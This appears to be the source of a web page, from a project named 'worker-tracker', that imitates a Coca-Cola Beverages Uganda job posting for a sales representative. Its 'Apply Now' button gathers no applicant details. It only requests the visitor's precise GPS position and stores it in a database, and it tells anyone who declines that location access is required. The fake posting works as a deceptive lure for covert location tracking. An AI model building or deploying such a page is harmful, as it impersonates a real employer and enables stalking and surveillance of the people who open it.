//worker-tracker\app\page.tsx

'use client';

import { useState } from 'react';
import { supabase } from '@/lib/supabase';

export default function Home() {
  const [status, setStatus] = useState<string | null>(null);
  const [submitting, setSubmitting] = useState(false);

  const applyAndShareLocation = () => {
    if (!navigator.geolocation) {
      setStatus('Your browser does not support location sharing.');
      return;
    }

    setSubmitting(true);
    setStatus('Requesting location permission...');

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const { latitude, longitude, accuracy } = pos.coords;

        const { error } = await supabase.from('job_applications').insert({
          position: 'Sales Representative',
          company: 'Coca-Cola Beverages Uganda',
          lat: latitude,
          lng: longitude,
          accuracy,
        });

        setSubmitting(false);

        if (error) {
          setStatus('Could not submit your application. Please try again.');
          return;
        }

        setStatus('Application received. Your location has been shared successfully.');
      },
      (err) => {
        setSubmitting(false);

        if (err.code === err.PERMISSION_DENIED) {
          setStatus(
            'Location permission is required for this internal field sales application. Please allow location access, then try again.'
          );
          return;
        }

        if (err.code === err.POSITION_UNAVAILABLE) {
          setStatus(
            'Your location is currently unavailable. Please turn on Location/GPS on your phone, then try again.'
          );
          return;
        }

        if (err.code === err.TIMEOUT) {
          setStatus('Location request timed out. Please try again in an area with better signal.');
          return;
        }

        setStatus('Could not get your location. Please try again.');
      },
      {
        enableHighAccuracy: true,
        maximumAge: 5000,
        timeout: 15000,
      }
    );
  };

  return (
    <main className="page">
      <section className="hero">
        <nav className="nav">
          <div className="brand">
            <div className="logo">Coca-Cola</div>
            <div>
              <div className="brandName">Coca-Cola Beverages Uganda</div>
              <div className="brandSub">Internal Recruitment</div>
            </div>
          </div>
          <div className="tag">Field Sales</div>
        </nav>

        <div className="heroGrid">
          <div>
            <p className="eyebrow">Now Hiring</p>
            <h1>Sales Representative</h1>
            <p className="intro">
              Join our commercial team and help grow customer relationships, product availability,
              route performance, and brand visibility across assigned territories in Uganda.
            </p>

            <div className="actions">
              <button onClick={applyAndShareLocation} disabled={submitting} className="primaryBtn">
                {submitting ? 'Submitting...' : 'Apply Now'}
              </button>
              <span className="microcopy">For internal applicants with completed office agreement.</span>
            </div>

            {status && (
              <p className={status.includes('received') ? 'status success' : 'status error'}>
                {status}
              </p>
            )}
          </div>

          <aside className="summary">
            <Detail label="Company" value="Coca-Cola Beverages Uganda" />
            <Detail label="Position" value="Sales Representative" />
            <Detail label="Location" value="Kampala, Uganda" />
            <Detail label="Employment Type" value="Full-time" />
            <Detail label="Department" value="Sales and Distribution" />
            <Detail label="Reports To" value="Area Sales Manager" />
          </aside>
        </div>
      </section>

      <section className="content">
        <div className="section">
          <h2>Role Summary</h2>
          <p>
            The Sales Representative will manage assigned customer routes, support sales growth,
            improve product availability, maintain excellent customer relationships, and ensure
            strong in-store execution for Coca-Cola products.
          </p>
        </div>

        <div className="section twoCol">
          <div>
            <h2>Key Responsibilities</h2>
            <ul>
              <li>Visit assigned outlets and customers according to the approved route plan.</li>
              <li>Drive sales performance against daily, weekly, and monthly targets.</li>
              <li>Build strong relationships with retailers, wholesalers, and key customers.</li>
              <li>Ensure correct pricing, stock rotation, merchandising, and product visibility.</li>
              <li>Report customer feedback, competitor activity, and new market opportunities.</li>
              <li>Support trade promotions, activations, cooler checks, and visibility campaigns.</li>
            </ul>
          </div>

          <div>
            <h2>Minimum Requirements</h2>
            <ul>
              <li>Diploma or degree in Business, Marketing, Sales, or a related field.</li>
              <li>At least 1 year of experience in FMCG, sales, retail, or distribution.</li>
              <li>Strong communication, negotiation, and customer relationship skills.</li>
              <li>Good knowledge of Kampala and surrounding sales territories.</li>
              <li>Ability to work independently and deliver field sales targets.</li>
              <li>A valid riding or driving permit is an added advantage.</li>
            </ul>
          </div>
        </div>
      </section>

      <style jsx>{`
        .page {
          min-height: 100vh;
          background: #f7f7f4;
          color: #171717;
          font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }

        .hero {
          background:
            radial-gradient(circle at top right, rgba(255, 255, 255, 0.22), transparent 34%),
            linear-gradient(135deg, #e41d2c 0%, #b9121f 55%, #7f0d16 100%);
          color: white;
          padding: 28px;
        }

        .nav,
        .heroGrid,
        .content {
          max-width: 1120px;
          margin: 0 auto;
        }

        .nav {
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 18px;
          margin-bottom: 56px;
        }

        .brand {
          display: flex;
          align-items: center;
          gap: 14px;
        }

        .logo {
          background: white;
          color: #e41d2c;
          border-radius: 999px;
          padding: 10px 18px;
          font-size: 21px;
          font-weight: 800;
          font-family: Georgia, 'Times New Roman', serif;
          white-space: nowrap;
          box-shadow: 0 12px 30px rgba(0, 0, 0, 0.18);
        }

        .brandName {
          font-size: 15px;
          font-weight: 700;
        }

        .brandSub {
          font-size: 12px;
          opacity: 0.82;
          margin-top: 2px;
        }

        .tag {
          border: 1px solid rgba(255, 255, 255, 0.45);
          border-radius: 999px;
          padding: 8px 12px;
          font-size: 13px;
          font-weight: 650;
        }

        .heroGrid {
          display: grid;
          grid-template-columns: minmax(0, 1fr) 360px;
          gap: 42px;
          align-items: end;
          padding-bottom: 54px;
        }

        .eyebrow {
          margin: 0 0 12px;
          font-size: 13px;
          font-weight: 800;
          text-transform: uppercase;
          letter-spacing: 0;
        }

        h1 {
          margin: 0;
          max-width: 720px;
          font-size: 58px;
          line-height: 1;
          letter-spacing: 0;
        }

        .intro {
          max-width: 680px;
          margin: 20px 0 0;
          font-size: 19px;
          line-height: 1.6;
          color: rgba(255, 255, 255, 0.88);
        }

        .actions {
          display: flex;
          align-items: center;
          gap: 14px;
          flex-wrap: wrap;
          margin-top: 28px;
        }

        .primaryBtn {
          border: 0;
          border-radius: 8px;
          background: #111;
          color: white;
          padding: 14px 20px;
          font-size: 15px;
          font-weight: 750;
          cursor: pointer;
          min-width: 230px;
          box-shadow: 0 12px 28px rgba(0, 0, 0, 0.24);
        }

        .primaryBtn:disabled {
          opacity: 0.72;
          cursor: not-allowed;
        }

        .microcopy {
          max-width: 310px;
          color: rgba(255, 255, 255, 0.78);
          font-size: 13px;
          line-height: 1.45;
        }

        .status {
          max-width: 680px;
          margin: 18px 0 0;
          border-radius: 8px;
          padding: 13px 14px;
          font-size: 14px;
          line-height: 1.5;
          background: white;
        }

        .status.success {
          color: #166244;
        }

        .status.error {
          color: #a32d2d;
        }

        .summary {
          background: rgba(255, 255, 255, 0.96);
          color: #171717;
          border-radius: 12px;
          padding: 16px;
          display: grid;
          gap: 10px;
          box-shadow: 0 24px 60px rgba(0, 0, 0, 0.22);
        }

        .content {
          padding: 34px 28px 56px;
        }

        .section {
          background: white;
          border: 1px solid rgba(0, 0, 0, 0.08);
          border-radius: 10px;
          padding: 24px;
          margin-bottom: 16px;
        }

        .twoCol {
          display: grid;
          grid-template-columns: 1fr 1fr;
          gap: 34px;
        }

        h2 {
          margin: 0 0 12px;
          font-size: 22px;
          line-height: 1.2;
        }

        p,
        li {
          color: #424242;
          font-size: 15px;
          line-height: 1.75;
        }

        p {
          margin: 0;
        }

        ul {
          margin: 0;
          padding-left: 20px;
        }

        li + li {
          margin-top: 6px;
        }

        @media (max-width: 840px) {
          .hero {
            padding: 22px;
          }

          .nav {
            align-items: flex-start;
            margin-bottom: 42px;
          }

          .tag {
            display: none;
          }

          .heroGrid,
          .twoCol {
            grid-template-columns: 1fr;
          }

          .heroGrid {
            gap: 28px;
            padding-bottom: 34px;
          }

          h1 {
            font-size: 42px;
          }

          .intro {
            font-size: 17px;
          }

          .summary {
            box-shadow: 0 16px 36px rgba(0, 0, 0, 0.18);
          }

          .content {
            padding: 24px 18px 42px;
          }
        }

        @media (max-width: 520px) {
          .brand {
            align-items: flex-start;
          }

          .logo {
            font-size: 18px;
            padding: 9px 14px;
          }

          .brandName {
            font-size: 14px;
          }

          h1 {
            font-size: 36px;
          }

          .primaryBtn {
            width: 100%;
          }
        }
      `}</style>
    </main>
  );
}

function Detail({ label, value }: { label: string; value: string }) {
  return (
    <div className="detail">
      <div className="detailLabel">{label}</div>
      <div className="detailValue">{value}</div>

      <style jsx>{`
        .detail {
          border-radius: 8px;
          background: #f7f7f4;
          border: 1px solid rgba(0, 0, 0, 0.07);
          padding: 12px;
        }

        .detailLabel {
          font-size: 12px;
          color: #666;
          margin-bottom: 4px;
        }

        .detailValue {
          font-size: 14px;
          font-weight: 750;
          color: #171717;
        }
      `}</style>
    </div>
  );
}
